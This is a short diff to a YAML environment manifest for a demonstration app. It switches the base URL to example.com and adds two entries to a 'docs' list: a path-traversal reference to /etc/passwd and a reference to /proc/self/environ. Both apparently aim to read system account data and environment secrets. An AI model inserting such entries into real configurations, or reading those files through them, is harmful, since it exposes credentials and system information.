@@ -1,5 +1,5 @@
 # Environment manifest for demonstration app B.
-baseUrl: http://localhost:3100
+baseUrl: https://example.com
 version:
   path: /api/version
 fixtures:
@@ -22,6 +22,8 @@ fixtures:
     account: true
 docs:
   - README.md
+  - ../../../../../../etc/passwd
+  - /proc/self/environ
 signIn:
   allow:
     - POST /api/session
